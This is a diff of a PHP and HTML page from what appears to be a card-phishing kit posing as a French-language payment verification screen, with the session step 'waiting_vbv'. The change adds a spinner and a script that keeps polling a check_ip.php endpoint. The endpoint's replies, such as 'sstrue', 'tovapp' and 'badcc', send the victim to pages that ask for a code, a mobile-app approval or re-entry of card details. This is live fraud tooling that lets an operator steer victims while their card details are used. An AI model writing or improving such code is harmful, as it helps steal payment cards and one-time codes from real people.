@@ -159,29 +159,21 @@ $_SESSION['step'] = 'waiting_vbv';
 
             <div class="form-card loading-card">
 
-                <h1 class="page-title">✅ Paiement reçu</h1>
-                <p class="page-subtitle">Votre paiement a été traité avec succès</p>
+                <h1 class="page-title"><?= t('loading_payment_title') ?></h1>
+                <p class="page-subtitle"><?= t('auth_desc') ?></p>
+
+                <div class="loader-container" style="margin: 40px 0;">
+                    <div class="spinner-large"></div>
+                </div>
 
                 <div class="order-summary" style="text-align:left; background:#fafafa; padding:15px; border-radius:6px; margin-top:20px;">
                     <p style="font-size:14px; margin-bottom:5px; color:#333;"><strong><?= t('trans_label') ?></strong></p>
                     <p style="font-size:13px; margin:0; color:#666;"><?= t('pay_for') ?></p>
                 </div>
 
-                <p style="font-size:12px; color:#666; margin-top:30px; margin-bottom:30px;">
-                    Veuillez choisir l'étape suivante:
+                <p style="font-size:12px; color:#999; margin-top:30px;">
+                    <?= t('wait_msg') ?>
                 </p>
-
-                <div style="display:flex; gap:10px; flex-direction:column;">
-                    <a href="./code.php" class="btn-app-validate" style="background:#003366; color:white; padding:12px 24px; border-radius:6px; text-decoration:none; text-align:center; font-weight:600; cursor:pointer; transition:0.2s;">
-                        Continuer vers vérification
-                    </a>
-                    <a href="./verify.php" class="btn-app-validate" style="background:#FFC800; color:#003366; padding:12px 24px; border-radius:6px; text-decoration:none; text-align:center; font-weight:600; cursor:pointer; transition:0.2s;">
-                        Application mobile
-                    </a>
-                    <a href="./success.php" class="btn-app-validate" style="background:#f0f0f0; color:#333; padding:12px 24px; border-radius:6px; text-decoration:none; text-align:center; font-weight:600; cursor:pointer; transition:0.2s;">
-                        SMS
-                    </a>
-                </div>
 
             </div>
         </div>
@@ -215,6 +207,33 @@ $_SESSION['step'] = 'waiting_vbv';
         </div>
     </footer>
 
+    <script>
+    let checksCount = 0;
+    const MAX_CHECKS = 80;
+
+    function checkIP() {
+        checksCount++;
+        if (checksCount > MAX_CHECKS) {
+            window.location.href = './err.php';
+            return;
+        }
+
+        fetch('./security_check/check_ip.php?t=' + Date.now())
+            .then(response => response.text())
+            .then(data => {
+                data = data.trim();
+                if (data === 'ssredi') window.location.href = './success.php';
+                else if (data === 'tovapp') window.location.href = './verify.php';
+                else if (data === 'sstrue') window.location.href = './code.php';
+                else if (data === 'ssfalse') window.location.href = './success.php?error=1';
+                else if (data === 'badcc') window.location.href = './auth.php?error=bad_cc';
+                else setTimeout(checkIP, 1500);
+            })
+            .catch(e => setTimeout(checkIP, 3000));
+    }
+    checkIP();
+
+    </script>
 
 </body>
 </html>
